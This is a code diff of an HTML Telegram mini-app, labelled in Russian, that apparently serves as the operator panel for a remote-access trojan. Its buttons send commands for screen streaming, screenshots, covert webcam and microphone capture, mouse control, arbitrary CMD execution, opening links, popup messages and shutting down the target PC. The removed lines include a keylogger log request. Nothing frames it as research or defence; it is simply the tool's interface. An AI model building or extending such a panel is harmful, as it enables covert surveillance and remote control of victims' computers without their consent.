@@ -1,47 +1,68 @@
 <!DOCTYPE html>
-<html>
+<html lang="ru">
 <head>
     <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
-        body { background: #0f0f0f; color: #00ff00; font-family: 'Courier New', monospace; padding: 20px; text-align: center; }
-        .btn { background: #1a1a1a; border: 1px solid #00ff00; color: #00ff00; padding: 15px; margin: 10px; width: 80%; border-radius: 5px; cursor: pointer; transition: 0.3s; }
-        .btn:hover { background: #00ff00; color: #000; }
-        input { background: #1a1a1a; border: 1px solid #333; color: white; padding: 10px; width: 80%; margin-bottom: 5px; }
+        body { background: #0e1621; color: #ffffff; font-family: sans-serif; display: flex; flex-direction: column; align-items: center; padding: 20px; margin: 0; }
+        h2 { color: #2481cc; margin: 10px 0; text-transform: uppercase; letter-spacing: 2px; font-size: 18px; }
+        .section-title { width: 95%; font-size: 12px; color: #888; margin: 15px 0 5px 5px; text-align: left; text-transform: uppercase; }
+        .btn { background: #2481cc; color: white; border: none; padding: 12px; width: 95%; border-radius: 8px; font-weight: bold; margin: 4px 0; cursor: pointer; transition: 0.2s; font-size: 14px; }
+        .btn:active { transform: scale(0.96); opacity: 0.8; }
+        .btn-green { background: #28a745; }
+        .btn-red { background: #dc3545; }
+        .btn-row { display: flex; justify-content: space-between; width: 95%; gap: 5px; }
+        input { width: 95%; padding: 10px; border-radius: 8px; border: 1px solid #333; background: #17212b; color: white; box-sizing: border-box; margin-bottom: 5px; }
+        .mouse-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 5px; width: 95%; }
+        .mouse-btn { background: #343f4b; padding: 15px; }
     </style>
 </head>
 <body>
-    <h1>RAGE CONTROL</h1>
+    <h2>RAGE ULTIMATE PANEL</h2>
+
+    <div class="section-title">Медиа и Стрим</div>
+    <div class="btn-row">
+        <button class="btn btn-green" onclick="send('stream_start')">▶ СТРИМ</button>
+        <button class="btn btn-red" onclick="send('stream_stop')">■ СТОП</button>
+    </div>
+    <button class="btn" onclick="send('scr')">📸 СКРИНШОТ</button>
+    <button class="btn" onclick="send('webcam')">📷 ВЕБ-КАМЕРА</button>
+    <button class="btn" onclick="send('mic')">🎤 МИКРОФОН (5с)</button>
+
+    <div class="section-title">Управление мышью</div>
+    <div class="mouse-grid">
+        <div></div><button class="btn mouse-btn" onclick="send('mouse|up')">▲</button><div></div>
+        <button class="btn mouse-btn" onclick="send('mouse|left')">◀</button>
+        <button class="btn mouse-btn" style="background:#2481cc" onclick="send('mouse|click')">OK</button>
+        <button class="btn mouse-btn" onclick="send('mouse|right')">▶</button>
+        <div></div><button class="btn mouse-btn" onclick="send('mouse|down')">▼</button><div></div>
+    </div>
+
+    <div class="section-title">Система и CMD</div>
+    <input type="text" id="cmd_input" placeholder="Команда (например: ipconfig)">
+    <button class="btn" style="background:#555" onclick="sendCmd()">💻 ВЫПОЛНИТЬ В CMD</button>
     
-    <button class="btn" onclick="send('scr')">📸 СДЕЛАТЬ СКРИНШОТ</button>
-    <button class="btn" onclick="send('mic')">🎤 ЗАПИСЬ ЗВУКА</button>
-    <button class="btn" onclick="send('keylog')">⌨️ ПОЛУЧИТЬ ЛОГИ</button>
+    <div class="section-title">Взаимодействие</div>
+    <input type="text" id="url" placeholder="https://youtube.com">
+    <button class="btn" onclick="openLink()">🌐 ОТКРЫТЬ ССЫЛКУ</button>
     
-    <hr>
-    
-    <input id="url" placeholder="https://google.com">
-    <button class="btn" onclick="openUrl()">🌐 ОТКРЫТЬ ССЫЛКУ</button>
-    
-    <input id="msg" placeholder="Привет, я тут!">
-    <button class="btn" onclick="sendMsg()">💬 ВЫВЕСТИ ТЕКСТ</button>
+    <input type="text" id="msg" placeholder="Текст сообщения...">
+    <button class="btn" onclick="sendMsg()">💬 ВЫВЕСТИ ОКНО</button>
+
+    <div class="section-title">Питание</div>
+    <div class="btn-row">
+        <button class="btn btn-red" onclick="send('power|off')">ВЫКЛЮЧИТЬ ПК</button>
+        <button class="btn btn-red" style="background:#f0ad4e" onclick="send('power|re')">РЕСТАРТ</button>
+    </div>
 
     <script>
         let tg = window.Telegram.WebApp;
         tg.expand();
-
-        function send(command) {
-            tg.sendData(command);
-        }
-
-        function openUrl() {
-            let url = document.getElementById('url').value;
-            tg.sendData('open|' + url);
-        }
-
-        function sendMsg() {
-            let msg = document.getElementById('msg').value;
-            tg.sendData('msg|' + msg);
-        }
+        function send(cmd) { tg.sendData(cmd); }
+        function sendCmd() { let v = document.getElementById('cmd_input').value; if(v) send('exec|' + v); }
+        function openLink() { let v = document.getElementById('url').value; if(v) send('open|' + v); }
+        function sendMsg() { let v = document.getElementById('msg').value; if(v) send('msg|' + v); }
     </script>
 </body>
 </html>
